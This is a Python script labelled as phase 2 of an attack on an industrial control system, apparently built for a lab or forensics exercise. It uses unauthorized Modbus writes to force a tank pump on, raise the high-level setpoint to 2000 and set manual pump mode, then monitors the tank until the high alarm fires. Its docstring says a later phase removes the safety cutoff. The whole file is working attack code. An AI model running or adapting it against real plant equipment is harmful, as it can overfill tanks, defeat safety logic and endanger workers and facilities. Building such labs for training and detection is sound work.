#!/usr/bin/env python3
"""
ATTACK PHASE 2 -- PROCESS MANIPULATION via unauthorized Modbus writes.
All writes originate from the attacker (172.28.0.66), NOT the HMI (172.28.0.20),
so they are the smoking gun in the pcap.

  - FC05  write single coil  : force PUMP coil ON               (%QX0.0 / coil 0)
  - FC06  write single reg   : raise HIGH setpoint far too high (%MW0  / HR1024)
  - FC16  write multiple regs: force MANUAL pump ON             (%MW2  / HR1026)

Against the LEGITIMATE program the critical-level SAFETY cutoff still fires, so
the tank is driven up to the alarm threshold and the operator SEES the alarm --
a crude, detectable attack. (Phase 3 removes that safety.)
"""
import time
from modbus_io import (connect, snapshot, log, UNIT,
                       COIL_PUMP, HR_SP_HIGH, HR_MANUAL)


def show(c, when):
    s = snapshot(c)
    log(f"state {when}: level_hmi={s.get('level_hmi')} true_level={s.get('true_level')} "
        f"pump={s.get('pump')} alarm={s.get('alarm')} sp_high={s.get('sp_high')} "
        f"manual={s.get('manual')}")
    return s


def main():
    c = connect()
    log("=== PHASE 2: PROCESS MANIPULATION ===")
    show(c, "BEFORE")

    log("FC05  -> force PUMP coil ON (coil 0 / %QX0.0)")
    c.write_coil(COIL_PUMP, True, slave=UNIT)
    time.sleep(1)

    log("FC06  -> raise HIGH setpoint to 2000 (HR1024 / %MW0) so the pump never auto-stops")
    c.write_register(HR_SP_HIGH, 2000, slave=UNIT)
    time.sleep(1)

    log("FC16  -> force MANUAL pump command = 1 (HR1026 / %MW2)")
    c.write_registers(HR_MANUAL, [1], slave=UNIT)
    time.sleep(1)

    show(c, "AFTER-WRITES")
    log("Letting the manipulated process run until the HIGH alarm fires (max ~220s)...")
    for _ in range(22):
        time.sleep(10)
        s = show(c, "running")
        if s.get("alarm") == 1:
            log("HIGH alarm is now ACTIVE and visible to the operator (safety cutoff held).")
            break

    c.close()
    log("=== PHASE 2 complete — on the legit program the safety cutoff pins the "
        "level near 950 and raises the alarm (operator-visible). ===")


if __name__ == "__main__":
    main()
